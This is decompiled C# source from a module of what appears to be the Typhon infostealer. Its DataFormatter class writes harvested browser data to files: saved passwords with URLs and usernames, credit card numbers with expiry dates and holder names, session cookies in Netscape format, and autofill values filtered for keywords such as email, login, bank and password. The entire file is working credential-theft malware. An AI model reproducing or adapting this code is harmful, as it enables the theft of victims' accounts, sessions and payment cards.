using System;
using System.Collections.Generic;
using System.IO;

namespace Typhon.Modules.Miscellaneous
{
	// Token: 0x02000038 RID: 56
	internal class DataFormatter
	{
		// Token: 0x060000E0 RID: 224 RVA: 0x00008BD2 File Offset: 0x00006DD2
		private static string ParsePWD(DataModels.Password pPassword, string application)
		{
			return string.Format("URL: {0}\nUsername: {1}\nPassword: {2}\nApplication: {3}\n==================================\n\n", new object[]
			{
				pPassword.sUrl,
				pPassword.sUsername,
				pPassword.sPassword,
				application
			});
		}

		// Token: 0x060000E1 RID: 225 RVA: 0x00008C08 File Offset: 0x00006E08
		private static string ParseCC(DataModels.CreditCard cCard)
		{
			return string.Format("Type: {0}\nNumber: {1}\nExpiry: {2}\nHolder: {3}\n\n", new object[]
			{
				CCHelper.DetectCCType(cCard.sNumber),
				cCard.sNumber,
				cCard.sExpMonth + "/" + cCard.sExpYear,
				cCard.sName
			});
		}

		// Token: 0x060000E2 RID: 226 RVA: 0x00008C64 File Offset: 0x00006E64
		private static string ParseC(DataModels.Cookie cCookie)
		{
			return string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", new object[]
			{
				cCookie.sHostKey,
				cCookie.sPath,
				cCookie.sExpiresUtc,
				cCookie.sName,
				cCookie.sValue
			});
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x00008CB3 File Offset: 0x00006EB3
		private static string ParseAF(DataModels.AutoFill aFill)
		{
			return string.Format("Name: {0}\nValue: {1}\n==================================\n\n", aFill.sName, aFill.sValue);
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x00008CCD File Offset: 0x00006ECD
		private static string ParseAF(DataModels.AutoFill aFill, string application)
		{
			return string.Format("Name: {0}\nValue: {1}\nApplication: {2}\n==================================\n\n", aFill.sName, aFill.sValue, application);
		}

		// Token: 0x060000E5 RID: 229 RVA: 0x00008CE8 File Offset: 0x00006EE8
		public static bool WriteCookies(List<DataModels.Cookie> cCookies, string sFile)
		{
			bool result;
			try
			{
				foreach (DataModels.Cookie cCookie in cCookies)
				{
					File.AppendAllText(sFile, DataFormatter.ParseC(cCookie));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x00008D54 File Offset: 0x00006F54
		public static bool WriteAutoFills(List<DataModels.AutoFill> aFills, string sFile)
		{
			bool result;
			try
			{
				foreach (DataModels.AutoFill aFill in aFills)
				{
					File.AppendAllText(sFile, DataFormatter.ParseAF(aFill));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x00008DC0 File Offset: 0x00006FC0
		internal static bool WriteImportantAutoFills(List<DataModels.AutoFill> aFills, string sFile, string application)
		{
			bool result;
			try
			{
				List<string> list = new List<string>
				{
					"email",
					"e-mail",
					"phone",
					"name",
					"username",
					"usrname",
					"register",
					"login",
					"bank",
					"password"
				};
				foreach (DataModels.AutoFill aFill in aFills)
				{
					if (list.Contains(aFill.sName))
					{
						File.AppendAllText(sFile, DataFormatter.ParseAF(aFill, application));
					}
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x00008EB0 File Offset: 0x000070B0
		public static bool WritePassword(List<DataModels.Password> pPasswords, string sFile, string application)
		{
			bool result;
			try
			{
				foreach (DataModels.Password pPassword in pPasswords)
				{
					if (!(pPassword.sUsername == "") && !(pPassword.sPassword == ""))
					{
						File.AppendAllText(sFile, DataFormatter.ParsePWD(pPassword, application));
					}
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x00008F40 File Offset: 0x00007140
		public static bool WriteCC(List<DataModels.CreditCard> cCC, string sFile)
		{
			bool result;
			try
			{
				foreach (DataModels.CreditCard cCard in cCC)
				{
					File.AppendAllText(sFile, DataFormatter.ParseCC(cCard));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
